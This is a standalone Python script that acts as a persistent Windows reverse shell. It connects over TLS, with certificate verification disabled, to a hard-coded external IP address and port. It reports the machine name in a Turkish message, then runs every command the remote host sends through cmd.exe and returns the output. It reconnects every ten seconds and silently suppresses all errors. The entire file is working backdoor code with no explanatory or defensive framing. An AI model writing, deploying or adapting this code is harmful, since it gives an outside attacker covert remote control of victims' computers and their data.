import socket, ssl, subprocess, os, time

h = '185.194.175.132'
p = 7001

while True:
    s = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        
        if hasattr(socket, "SIO_KEEPALIVE_VALS"):
            s.ioctl(socket.SIO_KEEPALIVE_VALS, (1, 30000, 30000))
        
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        
        ssls = ctx.wrap_socket(s, server_hostname='lab-manager')
        ssls.connect((h, p))
        
        ssls.send(f'--- Cihaz Baglandi: {os.environ.get("COMPUTERNAME","PC")} ---\n'.encode())
        
        while True:
            d = ssls.recv(4096).decode('utf-8', 'ignore')
            
            if not d:
                break
            
            cmd = d.strip()
            if cmd == 'exit':
                break
            
            if cmd:
                pr = subprocess.Popen(f'cmd.exe /c {cmd}', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                st, er = pr.communicate()
                ssls.send(st+er+b'\nSHELL> ')
                
    except Exception:
        pass
    finally:
        if s:
            try:
                s.close()
            except:
                pass
        time.sleep(10)